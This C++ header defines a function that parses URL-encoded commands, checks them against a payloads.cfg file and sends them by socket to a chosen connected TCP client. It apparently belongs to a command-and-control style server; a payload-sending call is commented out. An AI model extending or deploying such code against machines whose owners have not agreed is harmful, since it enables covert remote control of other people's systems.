#ifndef _SEND_TCP_COMMANDS_HPP_
#define _SEND_TCP_COMMANDS_HPP_

#include "../qnj_config.h"
#include "../server_2/TCP_handle_client.h"
#include "../networking/Parse_stuff/replace-characters.hpp"
#include "../networking/Parse_stuff/parse_payloads_cfg_file.hpp"
#include "./extract_payload_file.hpp"

void send_tcp_commands_to_client(std::string& cmd_value, std::string client_id_str) {
    replace_char(cmd_value, "%3A", ":");
    replace_char(cmd_value, "+", " ");

    std::istringstream iss(cmd_value);
    std::string command;
    std::string url;
    std::unordered_map<std::string, std::string> cmdMap;
    int client_id;

    if (!client_id_str.empty())
    {
        client_id = std::stoi(client_id_str);
    }

    if (!loadConfig("/root/qnj-server/payloads.cfg", cmdMap)) 
    {
        std::cout << "Loading payloads.cfg failed" << std::endl;
        return;
    }

    if (!(iss >> command)) {
        std::cout << "Error: Empty command\n";
        return;
    }

    int target_socket = QNJ_TCP_CLIENT_SOCKET[client_id];

    if (command == ":browse") 
    {
        if (!(iss >> url)) 
        {
            std::cout << "Error: Missing URL for browse command\n";
            return;
        }
        std::cout << "Browse URL: " << url << std::endl;
    }

    auto it = cmdMap.find(command);
    if (it != cmdMap.end())
    {
        send(target_socket, command.c_str(), command.size(), 0);
        //extract_payload_file(it->second, target_socket);
    }
    else 
    {
        std::cout << "Unknown command sent to TCP clients: " << command << "\n";
    }
}

#endif